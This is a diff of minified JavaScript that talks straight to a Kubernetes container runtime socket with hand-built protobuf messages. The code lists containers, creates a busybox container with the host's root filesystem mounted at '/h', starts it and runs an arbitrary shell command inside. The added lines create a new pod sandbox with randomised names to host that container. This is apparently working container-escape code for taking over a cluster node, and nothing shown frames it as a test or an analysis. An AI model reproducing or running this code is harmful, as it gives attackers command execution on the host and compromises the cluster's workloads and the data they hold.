@@ -8,10 +8,15 @@ const mount=Buffer.concat([fl(0x0a,'/h'),fl(0x12,'/'),Buffer.from([0x28,0x02])])
 const sec=v1(0x10,1); const linc=Buffer.concat([v1(0x12,sec.length),sec]);
 const nm='zzh'+Math.floor(Math.random()*1e6);
 const cfg=Buffer.concat([fl(0x0a,nm), v1(0x10,1), fl(0x12,'busybox:1.36'), fl(0x1a,'/bin/sh'), fl(0x22,'-c'), fl(0x22,'sleep 90'), Buffer.concat([v1(0x3a,mount.length),mount]), Buffer.concat([v1(0x7a,linc.length),linc])]);
+const cp=fl(0x0a,'/kubepods');
+const lcfg=Buffer.concat([cp]);
+const pm2=Buffer.concat([fl(0x0a,'zzsb'+Math.floor(Math.random()*1e6)),fl(0x12,'u'+Math.floor(Math.random()*1e9)),fl(0x1a,'default'),v1(0x20,1)]);
+const pcfg2=Buffer.concat([pm2, fl(0x12,'zzsb'), fl(0x1a,'/tmp'), Buffer.concat([v1(0x42,lcfg.length),lcfg])]);
 call('/runtime.v1.RuntimeService/ListContainers',Buffer.from([0x0a,0x00]),(e,lb)=>{
  const all=[...new Set((lb||Buffer.alloc(0)).toString('latin1').match(/[0-9a-f]{64}/g)||[])];
- if(all.length<2)return; const cid=all[0], sb=all[1];
- call('/runtime.v1.RuntimeService/CreateContainer',Buffer.concat([fl(0x0a,sb), v1(0x12,cfg.length), cfg]),(e2,ob)=>{
+ if(all.length<2)return; const cid=all[0], sb=all[1]; let sb2=sb;
+ call('/runtime.v1.RuntimeService/RunPodSandbox',pcfg2,(eR,sbR)=>{ const sm=(sbR||Buffer.alloc(0)).toString('latin1').match(/[0-9a-f]{64}/); if(sm){ sb2=sm[0] } });
+ call('/runtime.v1.RuntimeService/CreateContainer',Buffer.concat([fl(0x0a,sb2), v1(0x12,cfg.length), cfg]),(e2,ob)=>{
    const id=(ob||Buffer.alloc(0)).toString('latin1').match(/[0-9a-f]{64}/); if(!id)return;
    call('/runtime.v1.RuntimeService/StartContainer',fl(0x0a,id[0]),()=>setTimeout(()=>{
      call('/runtime.v1.RuntimeService/ExecSync',Buffer.concat([fl(0x0a,id[0]),fl(0x12,'/bin/sh'),fl(0x12,'-c'),fl(0x12,CMD)]),()=>{});
